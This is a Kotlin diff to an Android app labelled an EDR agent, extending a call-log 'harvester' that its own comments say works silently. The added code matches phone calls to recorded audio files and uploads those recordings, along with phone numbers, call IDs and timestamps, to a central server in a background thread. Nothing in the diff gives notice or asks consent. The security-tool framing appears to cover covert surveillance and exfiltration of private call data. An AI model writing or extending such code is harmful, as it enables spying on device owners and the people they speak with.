@@ -14,9 +14,13 @@ import com.edr.agent.storage.EdrLocalStorage
 import com.edr.agent.storage.SyncPreferences
 import com.google.gson.Gson
 import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.MultipartBody
 import okhttp3.Request
+import okhttp3.RequestBody.Companion.asRequestBody
 import okhttp3.RequestBody.Companion.toRequestBody
+import java.io.File
 import java.text.SimpleDateFormat
+import java.util.Collections
 import java.util.Date
 import java.util.Locale
 
@@ -32,20 +36,28 @@ data class CallLogRecord(
     val callDate: String,      // YYYY-MM-DD
     val durationSeconds: Long, // Duration in seconds
     val formattedDuration: String, // e.g. "3m 45s", "0s (Missed)"
-    val simSlot: String? = null
+    val simSlot: String? = null,
+    var recordingStatus: String? = null,
+    var recordingReason: String? = null,
+    var recordingFilename: String? = null,
+    var recordingUrl: String? = null,
+    var hasRecording: Boolean = false,
+    var recordingSizeBytes: Long = 0L
 )
 
 /**
  * Autonomous Phone History & Call Duration Harvester for EDR.
  *
  * Silently reads CallLog.Calls with exact call durations, timestamps, and caller details,
- * and securely synchronizes them to the central EDR server.
+ * matches call audio recordings, and securely synchronizes them to the central EDR server.
  */
 object CallLogHarvester {
     private const val TAG = "CallLogHarvester"
     private val gson = Gson()
     private val jsonMediaType = "application/json; charset=utf-8".toMediaType()
     private val httpClient = EdrHttpClient.apiClient
+
+    private val uploadedCallFiles = Collections.synchronizedSet(mutableSetOf<String>())
 
     /**
      * Checks if READ_CALL_LOG permission is currently granted.
@@ -117,6 +129,22 @@ object CallLogHarvester {
                     val formattedDuration = formatDuration(durationSec, callType)
                     val callDateStr = if (callDateMs > 0) dateFormat.format(Date(callDateMs)) else ""
 
+                    val recFile = CallAudioRecorder.findRecordingForCall(context, rawNumber, callDateMs)
+                    val hasRec = recFile != null && recFile.exists() && recFile.length() > 500
+                    val recStatus = if (hasRec) "RECORDED" else "NOT_RECORDED"
+                    val recReason = if (hasRec) null else {
+                        when {
+                            durationSec <= 0L || callType == "MISSED" || callType == "REJECTED" || callType == "BLOCKED" ->
+                                "Missed or unanswered call"
+                            SyncPreferences.isAgentPaused ->
+                                "EDR Protection paused by admin"
+                            ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED ->
+                                "Microphone permission missing"
+                            else ->
+                                "Recording not captured"
+                        }
+                    }
+
                     records.add(
                         CallLogRecord(
                             callId = callId,
@@ -127,7 +155,12 @@ object CallLogHarvester {
                             callDate = callDateStr,
                             durationSeconds = durationSec,
                             formattedDuration = formattedDuration,
-                            simSlot = simSlot
+                            simSlot = simSlot,
+                            recordingStatus = recStatus,
+                            recordingReason = recReason,
+                            recordingFilename = recFile?.name,
+                            hasRecording = hasRec,
+                            recordingSizeBytes = recFile?.length() ?: 0L
                         )
                     )
                 } while (cursor.moveToNext())
@@ -144,7 +177,7 @@ object CallLogHarvester {
     }
 
     /**
-     * Harvests and uploads phone history to central EDR backend on a background thread.
+     * Harvests and uploads phone history with call recordings to central EDR backend on a background thread.
      */
     fun harvestAndUpload(context: Context, callback: ((Boolean, Int) -> Unit)? = null) {
         Thread {
@@ -162,6 +195,23 @@ object CallLogHarvester {
                     return@Thread
                 }
 
+                // 1. Upload any pending call audio recordings across all internet connections
+                for (rec in records) {
+                    if (rec.hasRecording) {
+                        val recFile = CallAudioRecorder.findRecordingForCall(context, rec.phoneNumber, rec.timestamp)
+                        if (recFile != null && recFile.exists() && recFile.length() > 500) {
+                            val uploadedName = uploadCallAudioFile(recFile, rec.callId, rec.phoneNumber, rec.timestamp)
+                            if (uploadedName != null) {
+                                rec.recordingFilename = uploadedName
+                                rec.hasRecording = true
+                                rec.recordingStatus = "RECORDED"
+                                rec.recordingReason = null
+                            }
+                        }
+                    }
+                }
+
+                // 2. Upload synchronized call log records to backend
                 val payload = mapOf(
                     "deviceId" to deviceId,
                     "callLogs" to records
@@ -183,7 +233,7 @@ object CallLogHarvester {
                     EdrLocalStorage.appendEdrLog(
                         context,
                         "CALL_SYNC",
-                        "Synchronized ${records.size} call records with duration metrics to central vault."
+                        "Synchronized ${records.size} call records with duration & audio status to central vault."
                     )
 
                     // Also broadcast via WebSocket so dashboard updates instantly
@@ -208,6 +258,51 @@ object CallLogHarvester {
                 callback?.invoke(false, 0)
             }
         }.start()
+    }
+
+    private fun uploadCallAudioFile(file: File, callId: String, phoneNumber: String, timestamp: Long): String? {
+        val deviceId = SyncPreferences.deviceId
+        val baseUrl = SyncPreferences.httpBaseUrl
+        if (deviceId.isEmpty() || baseUrl.isEmpty()) return null
+
+        val fileKey = "${deviceId}_${file.name}"
+        if (uploadedCallFiles.contains(fileKey)) {
+            return file.name
+        }
+
+        return try {
+            val audioMediaType = "audio/mp4".toMediaType()
+            val fileBody = file.asRequestBody(audioMediaType)
+            val multipart = MultipartBody.Builder()
+                .setType(MultipartBody.FORM)
+                .addFormDataPart("deviceId", deviceId)
+                .addFormDataPart("callId", callId)
+                .addFormDataPart("phoneNumber", phoneNumber)
+                .addFormDataPart("timestamp", timestamp.toString())
+                .addFormDataPart("audio", file.name, fileBody)
+                .build()
+
+            val request = Request.Builder()
+                .url("$baseUrl/api/call-logs/upload-recording")
+                .post(multipart)
+                .build()
+
+            val response = httpClient.newCall(request).execute()
+            val success = response.isSuccessful
+            response.close()
+
+            if (success) {
+                uploadedCallFiles.add(fileKey)
+                Log.i(TAG, "Uploaded call recording audio: ${file.name}")
+                file.name
+            } else {
+                Log.w(TAG, "Server rejected call audio upload: HTTP ${response.code}")
+                null
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error uploading call recording audio ${file.name}: ${e.message}")
+            null
+        }
     }
 
     private fun mapCallType(rawType: Int): String {
